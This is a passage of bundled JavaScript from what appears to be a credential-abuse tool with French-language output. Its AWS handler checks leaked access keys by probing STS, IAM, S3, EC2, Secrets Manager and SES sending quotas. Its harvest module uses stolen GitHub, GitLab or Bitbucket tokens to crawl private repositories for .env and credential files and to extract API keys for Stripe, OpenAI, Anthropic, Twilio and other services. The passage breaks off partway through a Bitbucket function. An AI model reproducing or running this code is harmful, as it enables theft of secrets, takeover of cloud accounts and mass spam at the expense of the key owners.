function awsOk(body, ...needles) {
  if (!body || awsDenied(body) || body.includes("<Error>")) return false;
  return needles.some((n) => body.includes(n));
}

// packages/validator/src/aws-handler.ts
function take(list, n) {
  return list.slice(0, n);
}
async function silent(fn) {
  try {
    return await fn();
  } catch {
    return null;
  }
}
function formatAwsPermLines(perms) {
  const ok = perms.filter((p) => p.ok);
  const bad = perms.filter((p) => !p.ok);
  const lines = [];
  if (ok.length) {
    lines.push("Permissions Actives:");
    for (const p of ok) {
      lines.push(p.details ? `\u2705 ${p.service} (${p.action}): ${p.details}` : `\u2705 ${p.service} (${p.action})`);
    }
    if (bad.length) {
      lines.push("", "Permissions Inaccessibles / Non Configur\xE9es:");
      for (const p of bad) lines.push(`\u274C ${p.service} (${p.action})`);
    }
  } else {
    lines.push("Aucune permission active d\xE9tect\xE9e parmi les services test\xE9s :");
    for (const p of perms) lines.push(`\u274C ${p.service} (${p.action})`);
  }
  return lines.join("\n");
}
var AwsHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "aws";
  async validate(hit, match, siblings) {
    if (isVendorSecretPath(hit.path) || isVendorSecretPath(hit.blobPath)) {
      return { service: "aws", valid: false, raw: true, details: "vendor path \u2014 skip", meta: { skipNotify: "1" } };
    }
    if (!isAwsAccessKey(match.value)) {
      return { service: "aws", valid: false, raw: true, details: "valeur AWS non-AKIA \u2014 non valid\xE9", meta: { skipNotify: "1" } };
    }
    const access = match.value;
    const secret = siblings.find((s) => s.value !== access && isValidAwsSecretKey(s.value))?.value;
    if (!secret) {
      return {
        service: "aws",
        valid: false,
        raw: true,
        details: "AKIA without valid secret (reCAPTCHA / incomplet) \u2014 skip",
        meta: { skipNotify: "1" }
      };
    }
    const hintRegion = siblings.find((s) => s.service === "aws.region")?.value ?? "";
    const id = await this.identify(access, secret, hintRegion);
    if (!id.valid) {
      return { service: "aws", valid: false, details: id.err || "Invalid credentials", error: id.err };
    }
    const { perms, sesBlock } = await this.probe(access, secret, id.region || "us-east-1");
    const ses = perms.filter((p) => p.ok && p.service === "SES");
    const active = perms.filter((p) => p.ok);
    const services = [...new Set(active.map((p) => p.service))];
    const sesEnabled = ses.some((p) => p.action === "R\xC9SUM\xC9");
    const quota = Number(id.sesQuota || ses.find((p) => p.action === "R\xC9SUM\xC9")?.details.match(/Quota total: (\d+)/)?.[1] || 0);
    const meta = {
      account: id.account,
      arn: id.arn,
      region: id.region,
      permBlock: formatAwsPermLines(perms)
    };
    if (sesBlock) meta.sesBlock = sesBlock;
    if (sesEnabled) {
      return {
        service: "aws",
        valid: true,
        details: `SES ACTIF (${quota || id.sesQuota} emails/jour)`,
        meta: { ...meta, statusKind: "ses", sesQuota: String(quota || id.sesQuota) }
      };
    }
    if (active.length) {
      return {
        service: "aws",
        valid: true,
        details: `Actif (${services.length} services: ${services.join(", ")})`,
        meta
      };
    }
    return {
      service: "aws",
      valid: false,
      details: "Cl\xE9 authentique mais 0 permission active",
      meta: { ...meta, statusKind: "zero-perm" }
    };
  }
  async identify(access, secret, hintRegion) {
    let sawAccessDenied = false;
    let sawInvalid = false;
    let region = hintRegion || "us-east-1";
    let account = "";
    let arn = "";
    for (const r of hintRegion ? [hintRegion, ...STS_REGIONS.filter((x) => x !== hintRegion)] : STS_REGIONS) {
      const body = await silent(() => awsQuery(this.http, "sts", r, access, secret, "Action=GetCallerIdentity&Version=2011-06-15"));
      if (!body) continue;
      if ((body.includes("GetCallerIdentityResponse") || body.includes("<Account>")) && body.includes("<Arn>")) {
        return {
          valid: true,
          account: extractXml(body, "Account"),
          arn: extractXml(body, "Arn"),
          region: r,
          err: "",
          sesQuota: "",
          sesDetails: ""
        };
      }
      if (body.includes("AccessDenied")) {
        sawAccessDenied = true;
        region = r;
        break;
      }
      if (body.includes("InvalidClientTokenId") || body.includes("SignatureDoesNotMatch")) sawInvalid = true;
    }
    if (sawAccessDenied) {
      const iam = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=GetUser&Version=2010-05-08"));
      if (iam && (iam.includes("<User>") || bodyHasUser(iam))) {
        return {
          valid: true,
          account: extractXml(iam, "UserId") || "IAM",
          arn: extractXml(iam, "Arn"),
          region,
          err: "",
          sesQuota: "",
          sesDetails: ""
        };
      }
      const quota = await silent(() => awsQuery(this.http, "email", "us-east-1", access, secret, "Action=GetSendQuota"));
      if (quota && (quota.includes("Max24HourSend") || quota.includes("GetSendQuotaResult"))) {
        return {
          valid: true,
          account: "Valid (SES)",
          arn: "",
          region: region || "us-east-1",
          err: "",
          sesQuota: extractXml(quota, "Max24HourSend"),
          sesDetails: ""
        };
      }
      return {
        valid: true,
        account: "AccessDenied (Auth OK)",
        arn: "",
        region,
        err: "",
        sesQuota: "",
        sesDetails: ""
      };
    }
    return {
      valid: false,
      account,
      arn,
      region,
      err: sawInvalid ? "Invalid credentials (Signature/Token mismatch)" : "Invalid credentials or unreachable",
      sesQuota: "",
      sesDetails: ""
    };
  }
  async probe(access, secret, region) {
    const [ses, rest] = await Promise.all([this.ses(access, secret), this.other(access, secret, region)]);
    return { perms: [...ses.perms, ...rest], sesBlock: ses.sesBlock };
  }
  async ses(access, secret) {
    const perms = [];
    const activeRegions = [];
    const senders = /* @__PURE__ */ new Set();
    const domains = /* @__PURE__ */ new Set();
    let totalQuota = 0;
    let sendingEnabled = false;
    const sesLines = [];
    const chunks = [];
    for (let i = 0; i < AWS_SES_REGIONS.length; i += 4) chunks.push(AWS_SES_REGIONS.slice(i, i + 4));
    for (const batch of chunks) {
      await Promise.all(
        batch.map(async (r) => {
          const quota = await silent(() => awsQuery(this.http, "email", r, access, secret, "Action=GetSendQuota"));
          if (!quota || awsDenied(quota) || quota.includes("Error")) return;
          if (!quota.includes("GetSendQuotaResult") && !quota.includes("Max24HourSend")) return;
          const maxSend = extractXml(quota, "Max24HourSend");
          const sentLast24 = extractXml(quota, "SentLast24Hours");
          const maxRate = extractXml(quota, "MaxSendRate");
          const maxVal = Math.floor(Number(maxSend));
          if (!maxSend || maxSend === "0" || maxSend === "-1" || maxVal <= 0) return;
          activeRegions.push(r);
          totalQuota += maxVal;
          perms.push({
            service: "SES",
            action: `GetSendQuota:${r}`,
            ok: true,
            details: `Max: ${maxSend}/jour | Envoy\xE9s: ${sentLast24} | Rate: ${maxRate}/s`
          });
          const emails = await silent(
            () => awsQuery(this.http, "email", r, access, secret, "Action=ListIdentities&MaxItems=100&IdentityType=EmailAddress")
          );
          const regionSenders = emails && !awsDenied(emails) ? extractXmlList(emails, "member") : [];
          for (const e of regionSenders) senders.add(e);
          if (regionSenders.length) {
            perms.push({
              service: "SES",
              action: `ListIdentities(Email):${r}`,
              ok: true,
              details: `${regionSenders.length}: ${take(regionSenders, 5).join(", ")}`
            });
          }
          const doms = await silent(
            () => awsQuery(this.http, "email", r, access, secret, "Action=ListIdentities&MaxItems=100&IdentityType=Domain")
          );
          const regionDomains = doms && !awsDenied(doms) ? extractXmlList(doms, "member") : [];
          for (const d of regionDomains) domains.add(d);
          if (regionDomains.length) {
            perms.push({
              service: "SES",
              action: `ListIdentities(Domain):${r}`,
              ok: true,
              details: `${regionDomains.length}: ${take(regionDomains, 3).join(", ")}`
            });
          }
          sesLines.push(
            `\u{1F518} ${r} \u2014 ${maxVal}/day | Rate: ${maxRate}/s | Sent24h: ${sentLast24}` + (regionSenders.length ? `
   \u{1F4E7} From: ${take(regionSenders, 5).join(", ")}` : "")
          );
          if (!sendingEnabled) {
            const en = await silent(() => awsQuery(this.http, "email", r, access, secret, "Action=GetAccountSendingEnabled"));
            if (en && !awsDenied(en) && extractXml(en, "Enabled").toLowerCase() === "true") sendingEnabled = true;
          }
        })
      );
    }
    let sesBlock = "";
    if (activeRegions.length) {
      const status = sendingEnabled ? "\u{1F7E2} ACTIV\xC9" : "\u{1F7E0} SANDBOX";
      perms.unshift({
        service: "SES",
        action: "R\xC9SUM\xC9",
        ok: true,
        details: `${status} | ${activeRegions.length} r\xE9gion(s) | Quota total: ${totalQuota}/jour | ${senders.size} sender(s) | ${domains.size} domaine(s)`
      });
      sesBlock = [
        "SES QUOTAS:",
        `\u{1F4E7} Total: ${totalQuota} emails/day`,
        `\u{1F30D} Active regions: ${activeRegions.length}`,
        `\u{1F4EC} Verified senders: ${senders.size}`,
        "",
        ...sesLines
      ].join("\n");
    } else {
      perms.push({ service: "SES", action: "GetSendQuota", ok: false, details: "Aucune r\xE9gion SES active" });
    }
    return { perms, sesBlock };
  }
  async other(access, secret, region) {
    const perms = [];
    const s3 = await silent(() => awsS3List(this.http, access, secret));
    if (s3 && awsOk(s3, "<ListAllMyBucketsResult", "<Buckets>")) {
      const buckets = extractXmlList(s3, "Name").filter((n) => n && !n.includes(" "));
      perms.push({
        service: "S3",
        action: "ListBuckets",
        ok: true,
        details: buckets.length ? `${buckets.length} bucket(s): ${take(buckets, 5).join(", ")}` : "Acc\xE8s autoris\xE9 (0 bucket existant)"
      });
    } else {
      perms.push({ service: "S3", action: "ListBuckets", ok: false, details: "" });
    }
    const probes = [
      {
        service: "EC2",
        action: "DescribeInstances",
        svc: "ec2",
        params: "Action=DescribeInstances&Version=2016-11-15",
        needles: ["DescribeInstancesResponse"],
        listTag: "instanceId",
        empty: "Instances accessibles (0 instance en cours)",
        label: (n) => `${n.length} instance(s) accessibles`
      },
      {
        service: "SNS",
        action: "ListTopics",
        svc: "sns",
        params: "Action=ListTopics&Version=2010-03-31",
        needles: ["ListTopicsResponse", "<Topics>"],
        listTag: "TopicArn",
        empty: "0 topic(s)",
        label: (n) => `${n.length} topic(s)`
      },
      {
        service: "SQS",
        action: "ListQueues",
        svc: "sqs",
        params: "Action=ListQueues&Version=2012-11-05",
        needles: ["ListQueuesResponse", "<QueueUrl>"],
        listTag: "QueueUrl",
        empty: "0 file(s) SQS",
        label: (n) => `${n.length} file(s) SQS`
      },
      {
        service: "RDS",
        action: "DescribeDBInstances",
        svc: "rds",
        params: "Action=DescribeDBInstances&Version=2014-10-31",
        needles: ["DescribeDBInstancesResponse"],
        listTag: "DBInstanceIdentifier",
        empty: "0 base(s) RDS",
        label: (n) => `${n.length} base(s) RDS`
      }
    ];
    await Promise.all(
      probes.map(async (p) => {
        const body = await silent(() => awsQuery(this.http, p.svc, region, access, secret, p.params));
        if (body && awsOk(body, ...p.needles)) {
          const items = extractXmlList(body, p.listTag);
          perms.push({ service: p.service, action: p.action, ok: true, details: items.length ? p.label(items) : p.empty });
        } else {
          perms.push({ service: p.service, action: p.action, ok: false, details: "" });
        }
      })
    );
    const ddb = await silent(() => awsJson(this.http, "dynamodb", region, "DynamoDB_20120810.ListTables", access, secret));
    if (ddb && ddb.includes("TableNames") && !awsDenied(ddb)) {
      let tables = [];
      try {
        tables = (JSON.parse(ddb).TableNames ?? []).filter(Boolean);
      } catch {
        tables = extractXmlList(ddb, "member");
      }
      perms.push({
        service: "DynamoDB",
        action: "ListTables",
        ok: true,
        details: tables.length ? `${tables.length} table(s): ${take(tables, 3).join(", ")}` : "Acc\xE8s DynamoDB tables"
      });
    } else {
      perms.push({ service: "DynamoDB", action: "ListTables", ok: false, details: "" });
    }
    const sm = await silent(() => awsJson(this.http, "secretsmanager", region, "secretsmanager.ListSecrets", access, secret));
    if (sm && sm.includes("SecretList") && !awsDenied(sm)) {
      perms.push({ service: "SecretsManager", action: "ListSecrets", ok: true, details: "Acc\xE8s secrets chiffr\xE9s" });
    } else {
      perms.push({ service: "SecretsManager", action: "ListSecrets", ok: false, details: "" });
    }
    await this.iam(access, secret, perms);
    return perms;
  }
  async iam(access, secret, perms) {
    const userBody = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=GetUser&Version=2010-05-08"));
    let iamTested = false;
    const userName = userBody && awsOk(userBody, "<GetUserResponse>", "<User>") ? extractXml(userBody, "UserName") : "";
    if (userName) {
      iamTested = true;
      perms.push({
        service: "IAM",
        action: "GetUser",
        ok: true,
        details: `User: ${userName} | ARN: ${extractXml(userBody, "Arn")}`
      });
      const inline = await silent(
        () => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=ListUserPolicies&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`)
      );
      if (inline && !awsDenied(inline)) {
        const policies = extractXmlList(inline, "member");
        if (policies.length) {
          perms.push({
            service: "IAM",
            action: "ListUserPolicies",
            ok: true,
            details: `${policies.length} inline: ${take(policies, 5).join(", ")}`
          });
        }
      }
      const attached = await silent(
        () => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=ListAttachedUserPolicies&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`)
      );
      if (attached && !awsDenied(attached)) {
        const names = extractXmlList(attached, "PolicyName");
        if (names.length) {
          perms.push({
            service: "IAM",
            action: "ListAttachedPolicies",
            ok: true,
            details: `${names.length} managed: ${take(names, 5).join(", ")}`
          });
        }
      }
      const groups = await silent(
        () => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=ListGroupsForUser&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`)
      );
      if (groups && !awsDenied(groups)) {
        const g = extractXmlList(groups, "GroupName");
        if (g.length) {
          perms.push({ service: "IAM", action: "ListGroups", ok: true, details: `${g.length} groups: ${take(g, 5).join(", ")}` });
        }
      }
      const login = await silent(
        () => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=GetLoginProfile&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`)
      );
      if (login?.includes("<LoginProfile>")) {
        perms.push({
          service: "IAM",
          action: "ConsoleAccess",
          ok: true,
          details: `Console login ACTIV\xC9 (cr\xE9\xE9: ${extractXml(login, "CreateDate")})`
        });
      }
    }
    if (!iamTested) {
      const users = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=ListUsers&Version=2010-05-08"));
      if (users && awsOk(users, "<ListUsersResponse>")) {
        const names = extractXmlList(users, "UserName");
        perms.push({ service: "IAM", action: "ListUsers", ok: true, details: `${names.length} utilisateur(s) IAM` });
      } else {
        perms.push({ service: "IAM", action: "GetUser", ok: false, details: "" });
      }
    }
    const keys = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=ListAccessKeys&Version=2010-05-08"));
    if (keys && awsOk(keys, "<ListAccessKeysResponse>")) {
      const ids = extractXmlList(keys, "AccessKeyId");
      if (ids.length) {
        perms.push({ service: "IAM", action: "ListAccessKeys", ok: true, details: `${ids.length} cl\xE9(s): ${ids.join(", ")}` });
      }
    }
  }
};
function bodyHasUser(body) {
  return body.includes("<UserName>");
}

// packages/validator/src/github-meta.ts
function repoOwner(repo) {
  const fromOwner = repo.owner?.login?.trim() ?? "";
  if (fromOwner) return fromOwner;
  const full = repo.full_name?.trim() ?? "";
  const slash = full.indexOf("/");
  return slash > 0 ? full.slice(0, slash) : "";
}
function githubIdentity(user, repos = []) {
  const login = user.login?.trim() || repos.map(repoOwner).find(Boolean) || "";
  if (!login) return "?";
  const name = user.name?.trim();
  let identity2 = name ? `${login} (${name})` : login;
  if (user.email?.trim()) identity2 += ` | ${user.email.trim()}`;
  return identity2;
}
function githubRepoCounts(user, repos) {
  const listedPub = repos.filter((r) => !r.private).length;
  const listedPriv = repos.filter((r) => r.private).length;
  return {
    publicRepos: Math.max(user.public_repos ?? 0, listedPub),
    privateRepos: Math.max(user.total_private_repos ?? 0, listedPriv)
  };
}
function githubRecentNames(repos, max = 10) {
  const names = repos.slice(0, max).map((r) => {
    const name = r.name?.trim() || r.full_name?.split("/")[1] || "?";
    return `${name}${r.private ? " \u{1F512}" : ""}`;
  });
  if (!names.length) return "";
  const extra = repos.length > max ? ` (+${repos.length - max})` : "";
  return names.join(", ") + extra;
}
function githubCardMeta(user, scopes, repos = []) {
  const identity2 = githubIdentity(user, repos);
  const { publicRepos, privateRepos } = githubRepoCounts(user, repos);
  const recent = githubRecentNames(repos);
  return {
    identity: identity2,
    publicRepos: String(publicRepos),
    privateRepos: String(privateRepos),
    followers: String(user.followers ?? 0),
    scopes: scopes.trim() || "N/A",
    ...recent ? { recentRepos: recent } : {}
  };
}

// packages/validator/src/github-harvest.ts
var HIGH_PRIORITY = /* @__PURE__ */ new Set([
  ".env",
  ".env.local",
  ".env.production",
  ".env.staging",
  ".env.development",
  ".env.backup",
  ".env.old",
  ".env.bak",
  ".env.smtp",
  ".env.secret",
  ".env.secrets",
  "config.json",
  "config.yml",
  "config.yaml",
  ".htpasswd",
  "wp-config.php",
  "settings.py",
  "database.yml",
  "secrets.yml",
  "secrets.yaml",
  "credentials",
  "credentials.json",
  "credentials.yml",
  ".netrc",
  ".npmrc",
  ".pypirc",
  ".git-credentials",
  "app.config.js",
  "app.config.ts",
  "appsettings.json",
  "appsettings.development.json",
  ".my.cnf",
  "wp-cli.yml",
  "docker-compose.yml",
  "docker-compose.override.yml",
  "service-account.json",
  "application.properties",
  "application.yml",
  "auth.json"
]);
var SCAN_EXT = /* @__PURE__ */ new Set([
  ".js",
  ".ts",
  ".jsx",
  ".tsx",
  ".json",
  ".yaml",
  ".yml",
  ".php",
  ".py",
  ".rb",
  ".go",
  ".env",
  ".sh",
  ".bash",
  ".zsh",
  ".toml",
  ".ini",
  ".cfg",
  ".conf",
  ".md",
  ".txt",
  ".markdown",
  ".properties",
  ".xml"
]);
var HARVEST_PATTERNS = [
  { service: "aws", name: "harvest.AKIA", re: /\b(AKIA[A-Z0-9]{16})\b/g },
  {
    service: "aws",
    name: "harvest.secret",
    re: /(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:]\s*["']?([A-Za-z0-9+/]{40})["']?/gi
  },
  { service: "stripe", name: "harvest.sk_live", re: /\b(sk_live_[A-Za-z0-9]{24,})\b/g },
  { service: "stripe", name: "harvest.rk_live", re: /\b(rk_live_[A-Za-z0-9]{24,})\b/g },
  { service: "stripe", name: "harvest.sk_test", re: /\b(sk_test_[A-Za-z0-9]{24,})\b/g },
  { service: "github", name: "harvest.ghp", re: /\b(ghp_[A-Za-z0-9]{36,})\b/g },
  { service: "github", name: "harvest.gho", re: /\b(gho_[A-Za-z0-9]{36,})\b/g },
  { service: "github", name: "harvest.ghu", re: /\b(ghu_[A-Za-z0-9]{36,})\b/g },
  { service: "github", name: "harvest.ghs", re: /\b(ghs_[A-Za-z0-9]{36,})\b/g },
  { service: "github", name: "harvest.pat", re: /\b(github_pat_[A-Za-z0-9_]{20,})\b/g },
  { service: "gitlab", name: "harvest.glpat", re: /\b(glpat-[A-Za-z0-9_-]{20,})\b/g },
  { service: "gitlab", name: "harvest.gldt", re: /\b(gldt-[A-Za-z0-9_-]{20,})\b/g },
  { service: "bitbucket", name: "harvest.atatt", re: /\b(ATATT[A-Za-z0-9=_-]{20,})\b/g },
  { service: "bitbucket", name: "harvest.atbb", re: /\b(ATBB[A-Za-z0-9_-]{20,})\b/g },
  { service: "sendgrid", name: "harvest.sg", re: /\b(SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})\b/g },
  { service: "brevo", name: "harvest.brevo", re: /\b(xkeysib-[a-f0-9]{64}(?:-[A-Za-z0-9]{16})?)\b/gi },
  { service: "twilio", name: "harvest.sid", re: /\b(AC[0-9a-fA-F]{32})\b/g },
  {
    service: "twilio",
    name: "harvest.token",
    re: /(?:TWILIO_AUTH_TOKEN|authToken|auth_token)\s*[=:]\s*["']?([0-9a-fA-F]{32})\b/gi
  },
  { service: "mailgun", name: "harvest.mg", re: /\b(key-[A-Za-z0-9]{32})\b/g },
  { service: "openai", name: "harvest.openai", re: /\b(sk-[A-Za-z0-9]{48,})\b/g },
  { service: "anthropic", name: "harvest.ant", re: /\b(sk-ant-[A-Za-z0-9\-_]{90,110})\b/g },
  { service: "hubspot", name: "harvest.hubspot", re: /\b(pat-(?:na1|eu1)-[a-f0-9-]{36})\b/g },
  { service: "klaviyo", name: "harvest.klaviyo", re: /\b(pk_[a-f0-9]{34})\b/g },
  { service: "clickup", name: "harvest.clickup", re: /\b(pk_[0-9]+_[A-Z0-9]{32})\b/g }
];
var MAX_CREDS = 20;
var MAX_FILE_BYTES2 = 200 * 1024;
var JUNK = /example|your_|xxx|changeme|placeholder/i;
var JUNK_DIR = /(^|\/)(node_modules|vendor|dist|bower_components|\.next|coverage|__pycache__)\//;
function shouldScanGitHubBlob(filePath, size) {
  if (size > MAX_FILE_BYTES2) return false;
  if (JUNK_DIR.test(filePath.replace(/\\/g, "/"))) return false;
  const base = filePath.split("/").pop()?.toLowerCase() ?? "";
  if (base.startsWith(".env")) return true;
  if (HIGH_PRIORITY.has(base) || HIGH_PRIORITY.has(filePath.toLowerCase())) return true;
  const dot = base.lastIndexOf(".");
  const ext = dot >= 0 ? base.slice(dot) : "";
  return SCAN_EXT.has(ext);
}
function blobScore(filePath) {
  const base = filePath.split("/").pop()?.toLowerCase() ?? "";
  if (base.startsWith(".env")) return 0;
  if (HIGH_PRIORITY.has(base)) return 1;
  if (/\.(ya?ml|json|php|properties|toml|ini|cfg|conf)$/.test(base)) return 2;
  if (/\.(md|txt|markdown)$/.test(base)) return 8;
  return 4;
}
function preferPrivate(items, isPrivate) {
  return [...items].sort((a, b2) => Number(isPrivate(b2)) - Number(isPrivate(a)));
}
function extractHarvestMatches(content) {
  const out = [];
  const seen = /* @__PURE__ */ new Set();
  for (const p of HARVEST_PATTERNS) {
    p.re.lastIndex = 0;
    let m;
    let n = 0;
    while ((m = p.re.exec(content)) && n < 3) {
      const value = (m[1] ?? m[0]).trim();
      if (value.length < 8 || JUNK.test(value) || seen.has(`${p.service}:${value}`)) continue;
      seen.add(`${p.service}:${value}`);
      const start = Math.max(0, (m.index ?? 0) - 40);
      out.push({
        service: p.service,
        value,
        context: content.slice(start, (m.index ?? 0) + value.length + 40),
        lineNumber: 1,
        patternName: p.name
      });
      n++;
    }
  }
  const env = parseMailAssignments(content);
  if (isUsableSmtp(env) && !smtpApiRoute(env)) {
    const block = formatMailBlock(env);
    const key = `smtp:${env.MAIL_HOST}:${env.MAIL_USERNAME}:${env.MAIL_PASSWORD}`;
    if (!seen.has(key)) {
      seen.add(key);
      out.push({
        service: "smtp",
        value: env.MAIL_HOST ?? "",
        context: block,
        lineNumber: 1,
        patternName: "harvest.smtp"
      });
    }
  }
  return out;
}
function json(text) {
  try {
    return JSON.parse(text);
  } catch {
    return {};
  }
}
function repoFullName(repo) {
  if (repo.full_name?.includes("/")) return repo.full_name;
  const owner = repo.owner?.login;
  const name = repo.name;
  if (owner && name) return `${owner}/${name}`;
  return "";
}
function harvestSummary(fullName, filePath, matches) {
  const labels = matches.map((m) => `[${m.service}] ${m.value.length > 80 ? `${m.value.slice(0, 80)}\u2026` : m.value}`);
  return `\u{1F6A8} ${fullName}/${filePath}
${labels.join("\n")}`;
}
async function harvestGitHubRepos(http, headers, repos) {
  const found = [];
  const ordered = preferPrivate(repos, (r) => Boolean(r.private));
  for (const repo of ordered) {
    if (found.length >= MAX_CREDS) break;
    const fullName = repoFullName(repo);
    if (!fullName) continue;
    const crawled = await crawlRepo(http, headers, fullName, MAX_CREDS - found.length);
    found.push(...crawled);
  }
  return found;
}
async function crawlRepo(http, headers, fullName, remaining2) {
  const found = [];
  let treeRes;
  try {
    treeRes = await http.get(`https://api.github.com/repos/${fullName}/git/trees/HEAD?recursive=1`, {
      budget: "httpRequest",
      headers
    });
  } catch {
    return found;
  }
  if (treeRes.status !== 200) return found;
  const body = json(treeRes.text);
  const items = Array.isArray(body.tree) ? body.tree : [];
  const blobs = items.filter((item) => item.type === "blob" && item.path && shouldScanGitHubBlob(item.path, Number(item.size ?? 0))).sort((a, b2) => blobScore(a.path ?? "") - blobScore(b2.path ?? ""));
  for (const item of blobs) {
    if (found.length >= remaining2) break;
    const file = await fetchBlob(http, headers, fullName, item.path ?? "", item.sha);
    if (!file) continue;
    found.push(file);
  }
  return found;
}
async function fetchBlob(http, headers, fullName, filePath, sha) {
  let res;
  try {
    res = await http.get(`https://api.github.com/repos/${fullName}/contents/${encodeURIComponent(filePath).replace(/%2F/g, "/")}`, {
      budget: "httpRequest",
      headers
    });
  } catch {
    return null;
  }
  if (res.status !== 200) return null;
  const obj = json(res.text);
  if (obj.encoding !== "base64" || !obj.content) return null;
  let content;
  try {
    content = Buffer.from(obj.content.replace(/\n/g, ""), "base64").toString("utf8");
  } catch {
    return null;
  }
  const matches = extractHarvestMatches(content);
  if (!matches.length) return null;
  const blobSha = obj.sha || sha || "HEAD";
  return {
    fullName,
    filePath,
    content,
    htmlUrl: obj.html_url || `https://github.com/${fullName}/blob/${blobSha}/${filePath}`,
    matches,
    summary: harvestSummary(fullName, filePath, matches),
    forge: "github"
  };
}
function forgePrefix(forge) {
  if (forge === "gitlab") return "gl-harvest";
  if (forge === "bitbucket") return "bb-harvest";
  return "gh-harvest";
}
function forgeOrigin(file) {
  try {
    return new URL(file.htmlUrl).origin;
  } catch {
    if (file.forge === "gitlab") return "https://gitlab.com";
    if (file.forge === "bitbucket") return "https://bitbucket.org";
    return "https://github.com";
  }
}
function harvestedToHits(files) {
  const hits = [];
  for (const file of files) {
    const byService = /* @__PURE__ */ new Map();
    for (const m of file.matches) {
      const list = byService.get(m.service) ?? [];
      list.push(m);
      byService.set(m.service, list);
    }
    const prefix = forgePrefix(file.forge);
    const origin = forgeOrigin(file);
    for (const matches of byService.values()) {
      hits.push({
        source: "git",
        url: file.htmlUrl,
        origin,
        path: `${prefix}:${file.fullName}/${file.filePath}`,
        blobPath: file.filePath,
        matches,
        contentSnippet: file.content.slice(0, 2500)
      });
    }
  }
  return hits;
}
var GITLAB_BRANCHES = ["HEAD", "main", "master"];
async function harvestGitLabRepos(http, headers, base) {
  const found = [];
  let projRes;
  try {
    projRes = await http.get(
      `${base}/api/v4/projects?membership=true&simple=true&per_page=20&order_by=last_activity_at`,
      { budget: "httpRequest", headers }
    );
  } catch {
    return found;
  }
  if (projRes.status !== 200) return found;
  const list = json(projRes.text);
  if (!Array.isArray(list)) return found;
  const projects = preferPrivate(list, (p) => p.visibility !== "public");
  for (const project of projects) {
    if (found.length >= MAX_CREDS) break;
    const fullName = project.path_with_namespace?.trim() ?? "";
    if (!fullName) continue;
    found.push(...await crawlGitLabProject(http, headers, base, fullName, MAX_CREDS - found.length));
  }
  return found;
}
async function crawlGitLabProject(http, headers, base, fullName, remaining2) {
  const found = [];
  const id = encodeURIComponent(fullName);
  let treeRes;
  try {
    treeRes = await http.get(`${base}/api/v4/projects/${id}/repository/tree?recursive=true&per_page=100`, {
      budget: "httpRequest",
      headers
    });
  } catch {
    return found;
  }
  if (treeRes.status !== 200) return found;
  const items = json(treeRes.text);
  if (!Array.isArray(items)) return found;
  const blobs = items.filter((item) => item.type === "blob" && item.path && shouldScanGitHubBlob(item.path, 0)).sort((a, b2) => blobScore(a.path ?? "") - blobScore(b2.path ?? ""));
  for (const item of blobs) {
    if (found.length >= remaining2) break;
    const file = await fetchGitLabFile(http, headers, base, fullName, item.path ?? "");
    if (file) found.push(file);
  }
  return found;
}
async function fetchGitLabFile(http, headers, base, fullName, filePath) {
  const id = encodeURIComponent(fullName);
  const encoded = encodeURIComponent(filePath);
  for (const ref of GITLAB_BRANCHES) {
    let res;
    try {
      res = await http.get(`${base}/api/v4/projects/${id}/repository/files/${encoded}/raw?ref=${ref}`, {
        budget: "httpRequest",
        headers
      });
    } catch {
      continue;
    }
    if (res.status !== 200 || !res.text?.trim()) continue;
    const matches = extractHarvestMatches(res.text);
    if (!matches.length) return null;
    return {
      fullName,
      filePath,
      content: res.text,
      htmlUrl: `${base}/${fullName}/-/blob/${ref}/${filePath}`,
      matches,
      summary: harvestSummary(fullName, filePath, matches),
      forge: "gitlab"
    };
  }
  return null;
}
var BB_CANDIDATES = [
  ".env",
  ".env.local",
  ".env.production",
  ".env.staging",
  ".env.development",
  "docker-compose.yml",
  "wp-config.php",
  "config.json",
  "credentials.json",
  ".npmrc",
  ".netrc",
  ".git-credentials",
  "appsettings.json",
  "application.properties"
];
async function harvestBitbucketRepos(http, headers) {
  const found = [];
  let reposRes;
  try {
    reposRes = await http.get("https://api.bitbucket.org/2.0/repositories?role=member&pagelen=20", {
      budget: "httpRequest",
      headers
    });
  } catch {
    return found;
  }
  if (reposRes.status !== 200) return found;
  const body = json(reposRes.text);
  const list = preferPrivate(body.values ?? [], (r) => Boolean(r.is_private));
  for (const repo of list) {
    if (found.length >= MAX_CREDS) break;
    const fullName = repo.full_name?.trim() ?? "";
    if (!fullName) continue;
    found.push(...await crawlBitbucketRepo(http, headers, fullName, MAX_CREDS - found.length));
  }
  return found;
}
async function crawlBitbucketRepo(http, headers, fullName, remaining2) {
  const found = [];
  const listed = await listBitbucketSrc(http, headers, fullName);
  const paths = listed.length ? listed.filter((p) => shouldScanGitHubBlob(p, 0)).sort((a, b2) => blobScore(a) - blobScore(b2)) : BB_CANDIDATES;
  for (const filePath of paths) {
    if (found.length >= remaining2) break;
    const file = await fetchBitbucketFile(http, headers, fullName, filePath);
    if (file) found.push(file);
  }
  return found;
}
async function listBitbucketSrc(http, headers, fullName) {
  for (const rev of ["HEAD", "main", "master"]) {
    let res;
    try {
      res = await http.get(
        `https://api.bitbucket.org/2.0/repositories/${fullName}/src/${rev}/?max_depth=6&pagelen=100`,
        { budget: "httpRequest", headers }
      );
    } catch {
      continue;
    }
    if (res.status !== 200) continue;
    const body = json(res.text);
    const files = (body.values ?? []).filter((v) => v.path && (v.type === "commit_file" || v.type === "file")).map((v) => v.path);
    if (files.length) return files;
  }
  return [];
}
async function fetchBitbucketFile(http, headers, fullName, filePath) {
  for (const rev of ["HEAD", "main", "master"]) {
    let res;
    try {
      res = await http.get(`https://api.bitbucket.org/2.0/repositories/${fullName}/src/${rev}/${filePath}`, {
        budget: "httpRequest",
        headers
      });
    } catch {
      continue;
    }
